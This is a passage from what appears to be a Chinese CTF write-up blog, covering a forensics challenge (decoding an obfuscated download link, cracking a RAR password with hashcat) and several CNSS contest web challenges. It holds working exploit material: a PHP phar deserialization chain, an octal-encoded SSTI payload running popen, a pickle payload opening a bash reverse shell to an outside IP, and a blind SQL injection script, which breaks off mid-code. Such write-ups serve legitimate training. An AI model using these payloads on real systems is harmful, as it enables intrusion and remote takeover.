ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><span class="hljs-variable">$bytes</span>  = [<span class="hljs-title class_">System</span>.<span class="hljs-title class_">Convert</span>]::<span class="hljs-title class_">FromBase64String</span>(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$decoded</span> = [<span class="hljs-title class_">System</span>.<span class="hljs-title class_">Text</span>.<span class="hljs-title class_">Encoding</span>]::<span class="hljs-title class_">UTF8</span>.<span class="hljs-title class_">GetString</span>(<span class="hljs-variable">$bytes</span>); echo <span class="hljs-variable">$decoded</span></code></pre></div><p>解密得到</p><div class="code-wrapper"><pre><code class="hljs subunit">\u<span class="hljs-string">-65432</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65424</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65478</span>?\u<span class="hljs-string">-65489</span>?\u<span class="hljs-string">-65489</span>?\u<span class="hljs-string">-65418</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65434</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65485</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65483</span>?\u<span class="hljs-string">-65481</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65482</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65485</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65424</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65430</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65427</span>?\u<span class="hljs-string">-65415</span>?\u<span class="hljs-string">-65423</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65428</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65419</span>?\u<span class="hljs-string">-65436</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65437</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65427</span>?\u<span class="hljs-string">-65489</span>?\u<span class="hljs-string">-65456</span>?\u<span class="hljs-string">-65415</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65415</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65435</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65428</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65417</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65434</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65435</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65433</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65436</span>?\u<span class="hljs-string">-65421</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65427</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65436</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65458</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65420</span>?\u<span class="hljs-string">-65432</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65461</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65435</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65469</span>?\u<span class="hljs-string">-65457</span>?\u<span class="hljs-string">-65450</span>?\u<span class="hljs-string">-65463</span>?\u<span class="hljs-string">-65468</span>?\u<span class="hljs-string">-65491</span>?\u<span class="hljs-string">-65487</span>?\u<span class="hljs-string">-65479</span>?\u<span class="hljs-string">-65499</span>?\u<span class="hljs-string">-65486</span>?\u<span class="hljs-string">-65488</span>?\u<span class="hljs-string">-65424</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65426</span>?\u<span class="hljs-string">-65425</span>?\u<span class="hljs-string">-65431</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65490</span>?\u<span class="hljs-string">-65422</span>?\u<span class="hljs-string">-65439</span>?\u<span class="hljs-string">-65422</span>?</code></pre></div><p>RTF格式，用65536减去之后转ascii</p><p><code>https://vnctf-213-1257061123.cos.ap-nanjing-myqcloud.com/Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</code></p><p>RTF格式中使用\uN?表示一个unciode字符。\u后跟一个带符号的16位十进制整数值接一个占位符，用？表示。N大于32767的话，则表示为负数。解混淆示例如下：</p><p>L”h” &#x3D;&#x3D; 0x0068 &#x3D;&#x3D; -(-0x0068) &#x3D;&#x3D; -(0xFFFF+1-0x68) &#x3D;&#x3D; -65432&#x3D;\u-65432?是个链接，下载打开看到提示四位数字</p><p>工具爆破 9705   <code>Accent RAR Password Recovery</code></p><p><code>hashcat -m 13000 -a 3 --force &#39;$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8$56245cd11e4a1c2e&#39; &#39;?d?d?d?d&#39;</code></p><p>解压出来word文件</p><p>发现文件是zip文件头</p><p>进入<code>word</code>目录找到，<code>hideinfo.xml</code></p><p>发现是零宽隐写</p><h3 id="Do-you-like-Rhythm-Doctor"><a href="#Do-you-like-Rhythm-Doctor" class="headerlink" title="Do_you_like_Rhythm_Doctor"></a>Do_you_like_Rhythm_Doctor</h3><p>下载节奏医生编辑器</p><p>加载文件，</p><p>左下角调到第二个，发现有8个一组，矩形（square）是零，波形是1</p><p>一行一行读取即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS夏令营及招新赛</title>
    <link href="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/"/>
    <url>/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="EZRCE"><a href="#EZRCE" class="headerlink" title="EZRCE"></a>EZRCE</h2><p>限制长度RCE   长度为7</p><p>exec（加了回显，其实加不加无所谓，主要是给我这种菜的看看有没有成功而已）</p><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20231006154004476.png" alt="image-20231006154004476"></p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNSS</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shino</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shin0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;shin0 = <span class="hljs-string">&#x27;cnss&#x27;</span>;        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_sayhello</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;shin0 = <span class="hljs-variable language_">$this</span>-&gt;name;        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;shin0.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CN55</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_get</span>(<span class="hljs-string">&#x27;key&#x27;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$haha</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$file</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;key.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;haha[<span class="hljs-string">&#x27;hehe&#x27;</span>];        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;   <span class="hljs-comment">//Do you know &#x27;Php ARchive&#x27;?</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CN55</span>();<span class="hljs-variable">$c</span>-&gt;params[<span class="hljs-string">&#x27;key&#x27;</span>] = <span class="hljs-string">&quot;f1ag.php&quot;</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">&quot;f1ag.php&quot;</span>);<span class="hljs-variable">$b</span>-&gt;haha[<span class="hljs-string">&#x27;hehe&#x27;</span>] = <span class="hljs-variable">$c</span>;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CNSS</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-meta">?&gt;</span></code></pre></div><p>改a.phar 为a.jpg </p><p>然后phar:&#x2F;&#x2F;a.jpg</p><p>就那样吧</p><h2 id="can-can-need-shell-unsolved"><a href="#can-can-need-shell-unsolved" class="headerlink" title="can can need shell (unsolved)"></a>can can need shell (unsolved)</h2><p><a href="https://flyd.uk/post/cve-2023-24249/">https://flyd.uk/post/cve-2023-24249/</a>当时给的hint</p><p>文件上传，但是出题人手搓了个waf</p><p><img src="/../images/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20240215195803729.png" alt="image-20240215195803729"></p><p>后来又给了两个hint</p><blockquote><p>php关键词列表:<br><a href="https://www.php.net/manual/zh/reserved.keywords.php">https://www.php.net/manual/zh/reserved.keywords.php</a><br>参考这个:<br><a href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p></blockquote><p>但还是不会</p><p>看了<code>Fanllspd</code>师傅的WP</p><p>waf没有过滤<code>include</code>和引号</p><p>那就上传个一句话木马txt（蚁剑连不上，不造为什么</p><p>再用include包含它，执行就好了</p><p>太强了，这就是电子科技大学新生大佬吗</p><h2 id="CNSS娘の聊天室"><a href="#CNSS娘の聊天室" class="headerlink" title="CNSS娘の聊天室"></a>CNSS娘の聊天室</h2><p>发现是ssti，但是屏蔽了英文字母，我直接傻掉</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-comment">//payload</span>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__bases__&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[133]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>()&#125;&#125; <span class="hljs-comment">//转换为8进制</span>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\137\137\142\141\163\145\163\137\137&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]</span>()<span class="hljs-selector-attr">[133]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\137\137\151\156\151\164\137\137&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\160\157\160\145\156&#x27;</span>]</span>(<span class="hljs-string">&quot;\154\163&quot;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\162\145\141\144&#x27;</span>]</span>()&#125;&#125;</code></pre></div><p><img src="/../images/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20240215200240850.png" alt="image-20240215200240850"></p><p>想不到几个月后才找到<code>fanllspd</code>师傅的文章</p><p>看到个有意思的</p><p><img src="/../images/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20240215200403146.png" alt="image-20240215200403146"></p><p>好啊，你小子原来是蹭我车，我说这新生大佬也太强了，这找gadget都会</p><p>（嘻嘻</p><p><a href="https://fanllspd.com/posts/43716/">https://fanllspd.com/posts/43716/</a></p><h2 id="CNSS娘のFlag商店"><a href="#CNSS娘のFlag商店" class="headerlink" title="CNSS娘のFlag商店"></a>CNSS娘のFlag商店</h2><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20231007174523970.png" alt="image-20231007174523970"></p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(V\u0052\u0069\u0063\u0068</span><span class="hljs-string">I2000</span><span class="hljs-string">i__main__</span><span class="hljs-string">Hi</span><span class="hljs-string">.&#x27;&#x27;&#x27;</span>(V\u0052\u0069\u0063\u0068%<span class="hljs-number">0</span>aI2000%<span class="hljs-number">0</span>ai__main__%<span class="hljs-number">0</span>aHi%<span class="hljs-number">0</span>a.</code></pre></div><h2 id="CNSS娘の自助Flag商店"><a href="#CNSS娘の自助Flag商店" class="headerlink" title="CNSS娘の自助Flag商店"></a>CNSS娘の自助Flag商店</h2><p>反弹shell  (注意<code>&amp;</code>要url编码)</p><div class="code-wrapper"><pre><code class="hljs llvm">(S<span class="hljs-variable">%27</span>bash<span class="hljs-variable">%20</span>-i<span class="hljs-variable">%20</span>&gt;<span class="hljs-variable">%26</span><span class="hljs-variable">%20</span>/dev/tcp/<span class="hljs-number">118.89</span>.<span class="hljs-number">61.71</span>/<span class="hljs-number">7777</span><span class="hljs-variable">%200</span>&gt;<span class="hljs-variable">%261</span><span class="hljs-variable">%27</span><span class="hljs-variable">%0</span>aios<span class="hljs-variable">%0</span>asystem<span class="hljs-variable">%0</span>a(V\u<span class="hljs-number">0052</span>\u<span class="hljs-number">0069</span>\u<span class="hljs-number">0063</span>\u<span class="hljs-number">0068</span><span class="hljs-variable">%0</span>aI<span class="hljs-number">2000</span><span class="hljs-variable">%0</span>ai__main__<span class="hljs-variable">%0</span>aHi<span class="hljs-variable">%0</span>a.</code></pre></div><p>这两个pickle反序列化 都禁用R指令</p><p>手搓opcode永远的神</p><h2 id="newsql"><a href="#newsql" class="headerlink" title="newsql"></a>newsql</h2><p>正如其名newsql，考察的是mysql 8的新特性，table也能查看表</p><p>找网上的文章照样子试出来就行 </p><div class="code-wrapper"><pre><code class="hljs autoit">import requestsfuzz_ascii = list(range(<span class="hljs-number">32</span>,<span class="hljs-number">34</span>))+list(range(<span class="hljs-number">36</span>,<span class="hljs-number">38</span>))+list(range(<span class="hljs-number">40</span>,<span class="hljs-number">60</span>))+list(range(<span class="hljs-number">63</span>,<span class="hljs-number">92</span>))+list(range(<span class="hljs-number">93</span>,<span class="hljs-number">127</span>))<span class="hljs-meta"># fuzz_ascii = list(range(48,127))</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fuzz_ascii:    res = requests.get(        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table information_schema.columns limit 6,1) &gt; (&#x27;def&#x27;,&#x27;cnss&#x27;,&#x27;cn55&#x27;,&#x27;email&quot;</span> + chr(i) + <span class="hljs-string">&quot;&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table information_schema.columns limit 2,1) &gt; (&#x27;def&#x27;,&#x27;cnss&#x27;,&#x27;r&quot;</span> + chr(i) + <span class="hljs-string">&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table information_schema.schemata limit 4,1)&gt;(&#x27;def&#x27;,&#x27;cnss&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;,&#x27;&#x27;,4,5,6)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table 